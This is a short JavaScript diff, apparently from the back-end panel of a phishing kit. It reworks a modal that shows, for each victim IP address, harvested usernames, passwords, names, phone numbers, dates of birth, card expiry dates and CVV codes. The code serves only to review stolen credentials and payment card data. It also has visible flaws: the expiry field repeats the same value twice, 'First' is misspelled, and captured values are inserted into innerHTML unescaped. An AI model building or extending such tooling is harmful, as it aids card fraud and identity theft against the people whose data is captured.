@@ -152,10 +152,22 @@
                userData.forEach(([ipAddress, details]) => {
                  if(details.ip == ipModel){
                    if(details.getUserData){
-                     modalBody.innerHTML = `Result for IP: ${ipAddress}
-                     <br>Username: ${details.getUserData.username || ''}
-                     <br>Password: ${details.getUserData.password || ''}
-                     <br>UserAgent: ${details.getUserData.userAgent || ''}`;
+                     modalBody.innerHTML = `   <div class="card">
+        <div class="card-header">
+            IP: ${ipAddress}
+        </div>
+        <ul class="list-group list-group-flush">
+            <li class="list-group-item">Username: ${details.getUserData.username || 'N/A'}</li>
+            <li class="list-group-item">Password: ${details.getUserData.password || 'N/A'}</li>
+            <li class="list-group-item">UserAgent: ${details.getUserData.userAgent || 'N/A'}</li>
+            <li class="list-group-item">Fist Name: ${details.getUserData.fname || 'N/A'}</li>
+            <li class="list-group-item">Last Name: ${details.getUserData.lname || 'N/A'}</li>
+            <li class="list-group-item">Phone Number: ${details.getUserData.phone || 'N/A'}</li>
+            <li class="list-group-item">DOB: ${details.getUserData.dob1 || 'N/A'}/${details.getUserData.dob2 || 'N/A'}/${details.getUserData.dob3 || 'N/A'}</li>
+            <li class="list-group-item">Exp: ${details.getUserData.exp1 || 'N/A'}/${details.getUserData.exp1 || 'N/A'}</li>
+            <li class="list-group-item">Cvv: ${details.getUserData.cvv || 'N/A'}</li>
+        </ul>
+    </div>`;
                    } else {
                      modalBody.innerHTML = `No result for IP: ${ipAddress}`;
                    }
